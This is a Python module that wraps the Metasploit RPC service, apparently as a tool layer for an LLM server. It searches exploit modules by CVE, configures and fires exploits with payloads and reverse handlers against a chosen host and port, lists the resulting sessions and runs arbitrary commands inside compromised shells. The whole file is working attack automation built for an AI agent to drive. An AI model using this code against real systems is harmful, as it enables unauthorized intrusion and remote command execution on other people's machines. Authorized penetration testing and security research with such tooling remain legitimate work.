import os
import sys

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from Code_For_LLM_Server.llm_config import (
    MSF_RPC_HOST,
    MSF_RPC_PORT,
    MSF_RPC_USER,
    MSF_RPC_PASS,
    MSF_RPC_SSL,
)

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except ImportError as e:
    MsfRpcClient = None
    _IMPORT_ERROR = e
else:
    _IMPORT_ERROR = None

_client = None


def get_client():
    """Return a cached MsfRpcClient connected to msfrpcd. Raises a clear error if unavailable."""
    global _client
    if _client is not None:
        return _client

    if MsfRpcClient is None:
        raise RuntimeError(f"pymetasploit3 not installed: {_IMPORT_ERROR}")

    if not MSF_RPC_PASS:
        raise RuntimeError(
            "MSF_RPC_PASS is not set. Start msfrpcd and set MSF_RPC_PASS in .env, e.g.:\n"
            "  msfrpcd -P yourpass -U msf -a 127.0.0.1 -p 55553 -S"
        )

    try:
        _client = MsfRpcClient(
            MSF_RPC_PASS,
            username=MSF_RPC_USER,
            server=MSF_RPC_HOST,
            port=MSF_RPC_PORT,
            ssl=MSF_RPC_SSL,
        )
    except Exception as e:
        raise RuntimeError(
            f"Could not connect to msfrpcd at {MSF_RPC_HOST}:{MSF_RPC_PORT}: {e}. "
            f"Is msfrpcd running?"
        )
    return _client


def search_modules(query: str, limit: int = 20) -> list[dict]:
    """Search MSF modules by CVE ID or keyword. Returns [{path, rank, disclosure_date, name, type}]."""
    client = get_client()
    raw = client.modules.search(query) or []
    out = []
    for m in raw[:limit]:
        out.append({
            "path": m.get("fullname") or m.get("name") or "",
            "type": m.get("type", ""),
            "rank": m.get("rank", ""),
            "disclosure_date": str(m.get("disclosure_date", "") or ""),
            "name": m.get("name", ""),
        })
    return out


def run_exploit(
    module_path: str,
    rhost: str,
    rport: int,
    payload: str,
    lhost: str,
    lport: int,
    extra_options: dict | None = None,
) -> dict:
    """Load an exploit module, configure it, start a matching handler, and fire the exploit.

    Returns {job_id, uuid, started, output}.
    """
    client = get_client()
    mtype, mname = module_path.split("/", 1) if "/" in module_path else ("exploit", module_path)
    if mtype not in ("exploit", "auxiliary", "post"):
        mtype = "exploit"
        mname = module_path

    exploit = client.modules.use(mtype, mname)
    exploit["RHOSTS"] = rhost
    try:
        exploit["RPORT"] = int(rport)
    except Exception:
        pass
    exploit["LHOST"] = lhost
    exploit["LPORT"] = int(lport)

    if extra_options:
        for k, v in extra_options.items():
            exploit[k] = v

    payload_obj = client.modules.use("payload", payload)
    payload_obj["LHOST"] = lhost
    payload_obj["LPORT"] = int(lport)

    result = exploit.execute(payload=payload_obj)
    return {
        "job_id": result.get("job_id"),
        "uuid": result.get("uuid"),
        "started": result.get("job_id") is not None,
        "output": str(result),
    }


def list_sessions() -> list[dict]:
    client = get_client()
    sessions = client.sessions.list or {}
    out = []
    for sid, info in sessions.items():
        out.append({
            "id": int(sid) if str(sid).isdigit() else sid,
            "type": info.get("type", ""),
            "target_host": info.get("target_host", ""),
            "tunnel_peer": info.get("tunnel_peer", ""),
            "info": info.get("info", ""),
            "via_exploit": info.get("via_exploit", ""),
        })
    return out


def run_in_session(session_id: int, command: str, read_timeout: float = 5.0) -> str:
    """Execute a command inside an existing session and return its output."""
    import time
    client = get_client()
    sessions = client.sessions.list or {}
    key = str(session_id)
    if key not in sessions and session_id not in sessions:
        return f"Error: session {session_id} not found. Current sessions: {list(sessions.keys())}"

    shell = client.sessions.session(key if key in sessions else session_id)
    shell.write(command + "\n")
    time.sleep(read_timeout)
    try:
        return shell.read()
    except Exception as e:
        return f"Error reading from session: {e}"
